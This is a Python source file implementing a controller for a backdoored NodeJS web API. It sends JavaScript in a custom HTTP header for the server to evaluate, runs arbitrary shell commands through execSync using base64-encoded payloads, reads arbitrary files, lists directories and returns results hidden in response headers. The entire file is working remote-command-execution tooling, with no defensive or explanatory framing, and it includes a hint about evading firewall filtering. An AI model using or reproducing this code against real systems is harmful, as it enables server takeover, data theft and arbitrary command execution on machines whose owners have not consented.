import requests  # HTTP requests
import base64  # encode commands
from Exceptions import *
from ExploitProcessor import ExploitProcessor

"""
@brief The NodeExploitProcessor class is an abstract class that accepts commands
        passed into it and processes it to be sent to the backdoored NodeJS API.
        Inherits from the ExploitProcessor class. 
"""
class NodeExploitProcessor(ExploitProcessor):
    def __init__(self, host: str, path: str, method: str, header: str):
        super().__init__(host, path, method, header)

    """
    @brief See base class for details.
    """
    def _Base__make_connection(self):
        try:
            return self._Base__send_message(
                f"r.setHeader('{self.header}', process.cwd());"
                f"r.end();")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, "
                                   f"and METHOD are correct.")
    
    """
    @brief See base class for details.
    """
    def _Base__send_message(self, message: str):
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            return response.headers[self.header]
        except:
            raise CommandException(f"Message was not successfully processed.")
        
    """
    @brief Run a command on the target machine, and return its output as a
            string.
    @param command the command to be ran as a string
    @return a string of the output from the server, will be blank if it fails.
    @throw CommandException if there is a connection error.
    """
    def __run(self, command: str):  # relies on execSync being imported
        encoded = base64.b64encode(command.encode()).decode()
        out = self.__eval(f"try {{"
                            f"let out = execSync(Buffer.from('{encoded}',"
                                f"'base64').toString('ascii'),"
                                f"{{cwd: '{self.directory}'}});"
                            f"r.setHeader('{self.header}',"
                                f"Buffer.from(out).toString('base64'));}}"
                          f"catch (e){{"
                            f"r.setHeader('{self.header}',"
                            f"'RXJyb3IgcnVubmluZyBjb21tYW5kLgo=');}}"
                          f"r.end();")
        return base64.b64decode(out).decode()
    """
    @brief Run commands to be evaluated as JS code.
    @param command the command to be ran as a string
    @return any output received from the HTTP header.
    @throw CommandException if there is a connection error.
    """
    def __eval(self, command: str):
        out = self._Base__send_message(
            f"process.chdir('{self.directory}');"
            f"{command}")
        return out

    """
    @brief See base class for details.
    """
    def _Base__version(self, options: str):
        out = self.__eval(f"r.setHeader('{self.header}', "
                          f"Buffer.from(process.versions.node).toString('base64'));"
                          f"r.end();")
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__pwd(self, options: str):
        out = self.__eval(f"r.setHeader('{self.header}', "
                          f"Buffer.from(process.cwd()).toString('base64'));"
                          f"r.end();")
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__ls(self, options: str):  # relies on fs being imported
        out = self.__eval(f"r.setHeader('{self.header}', "
                          f"Buffer.from("
                            f"fs.readdirSync(process.cwd()).join(' '))"
                            f".toString('base64'));"
                          f"r.end();")
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__run(self, options: str): 
        out = self.__run(options)
        print(out, end='')

    """
    @brief See base class for details.
    """
    def _Base__cd(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a path.")
        out = self.__eval(f"process.chdir('{options}');"
                          f"r.setHeader('{self.header}', "
                          f"Buffer.from(process.cwd()).toString('base64'));"
                          f"r.end();")
        self.directory = base64.b64decode(out).decode()
        print(self.directory)

    """
    @brief See base class for details.
    """
    def _Base__cat(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to print.")
        out = self.__eval(f"let out='Error opening file.';"
                          f"if(!fs.existsSync('{options}')){{"
                            f"out='File does not exist.';"
                          f"}}else{{"
                            f"try {{"
                                f"out=fs.readFileSync('{options}', 'utf-8');"
                            f"}} catch (e) {{"
                                f"out='Error opening file.';"
                            f"}}"
                          f"}}"
                          f"r.setHeader('{self.header}',"
                          f"Buffer.from(out).toString('base64'));"
                          f"r.end();")
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__download(self, options: str):
        pass

    """
    @brief See base class for details.
    """
    def _Base__upload(self, options: str):
        pass

    """
    @brief See base class for details.
    """
    def _Base__rm(self, options: str):
        pass

    """
    @brief See base class for details.
    """
    def _Base__mkdir(self, options: str):
        pass